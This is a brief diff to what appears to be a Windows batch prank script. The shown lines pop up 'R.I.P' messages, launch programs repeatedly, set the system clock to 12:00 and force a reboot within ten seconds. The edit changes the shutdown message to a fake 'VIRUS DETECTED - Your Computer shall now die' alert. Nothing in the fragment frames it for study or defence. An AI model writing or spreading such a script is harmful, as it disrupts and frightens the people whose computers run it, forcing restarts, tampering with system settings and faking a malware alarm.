@@ -40,7 +40,7 @@ start calc
 cls
 msg * R.I.P
 msg * R.I.P
-shutdown -r -t 10 -c "VIRUS DETECTED"
+shutdown -r -t 10 -c "VIRUS DETECTED - Your Computer shall now die"
 start
 start
 time 12:00
